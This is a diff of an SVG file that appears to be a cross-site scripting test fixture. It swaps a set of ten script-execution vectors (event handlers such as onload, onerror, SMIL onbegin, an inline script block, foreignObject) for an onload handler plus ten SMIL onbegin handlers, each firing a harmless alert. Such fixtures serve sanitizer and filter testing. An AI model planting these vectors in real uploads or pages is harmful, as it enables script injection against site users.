@@ -1,57 +1,27 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<svg
-  xmlns="http://www.w3.org/2000/svg"
-  xmlns:xlink="http://www.w3.org/1999/xlink"
-  xmlns:ev="http://www.w3.org/2001/xml-events"
-  width="200" height="200"
-  onload="alert('XSS1')"
-  tabindex="0"
->
-  <!-- 2) Broken image onerror -->
-  <image x="0" y="0" width="1" height="1"
-         href="no-such.png"
-         onerror="alert('XSS2')" />
-
-  <!-- 3) SMIL animate onbegin -->
-  <circle cx="10" cy="10" r="0">
-    <animate attributeName="r"
-             from="0" to="1" dur="0.001s" begin="0"
+<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1" onload="alert('XSS0')">
+  <!-- a dummy rect so we can attach SMIL animations -->
+  <rect width="0" height="0">
+    <!-- Fire ten alerts in quick succession -->
+    <animate attributeName="width" from="0" to="0" begin="0s" dur="0.001s"
+             onbegin="alert('XSS1')" />
+    <animate attributeName="width" from="0" to="0" begin="0s" dur="0.001s"
+             onbegin="alert('XSS2')" />
+    <animate attributeName="width" from="0" to="0" begin="0s" dur="0.001s"
              onbegin="alert('XSS3')" />
-  </circle>
-
-  <!-- 4) Inline script -->
-  <script><![CDATA[
-    alert('XSS4');
-  ]]></script>
-
-  <!-- 5) foreignObject + img onerror -->
-  <foreignObject x="20" y="20" width="10" height="10">
-    <body xmlns="http://www.w3.org/1999/xhtml">
-      <img src="x" onerror="alert('XSS5')" />
-    </body>
-  </foreignObject>
-
-  <!-- 6) rect onmousemove -->
-  <rect x="40" y="0" width="10" height="10"
-        fill="none" stroke="black"
-        onmousemove="alert('XSS6')" />
-
-  <!-- 7) animateMotion onrepeat -->
-  <rect x="60" y="0" width="1" height="1">
-    <animateMotion path="M60,0 L61,1"
-                   dur="0.01s" repeatCount="1"
-                   onrepeat="alert('XSS7')" />
+    <animate attributeName="width" from="0" to="0" begin="0s" dur="0.001s"
+             onbegin="alert('XSS4')" />
+    <animate attributeName="width" from="0" to="0" begin="0s" dur="0.001s"
+             onbegin="alert('XSS5')" />
+    <animate attributeName="width" from="0" to="0" begin="0s" dur="0.001s"
+             onbegin="alert('XSS6')" />
+    <animate attributeName="width" from="0" to="0" begin="0s" dur="0.001s"
+             onbegin="alert('XSS7')" />
+    <animate attributeName="width" from="0" to="0" begin="0s" dur="0.001s"
+             onbegin="alert('XSS8')" />
+    <animate attributeName="width" from="0" to="0" begin="0s" dur="0.001s"
+             onbegin="alert('XSS9')" />
+    <animate attributeName="width" from="0" to="0" begin="0s" dur="0.001s"
+             onbegin="alert('XSS10')" />
   </rect>
-
-  <!-- 8) metadata onclick -->
-  <metadata onclick="alert('XSS8')"></metadata>
-
-  <!-- 9) ev:onclick on circle -->
-  <circle cx="80" cy="10" r="1"
-          ev:onclick="alert('XSS9')" />
-
-  <!-- 10) <a> onfocus -->
-  <a xlink:href="#" onfocus="alert('XSS10')">
-    <rect x="100" y="0" width="1" height="1" fill="transparent" />
-  </a>
 </svg>
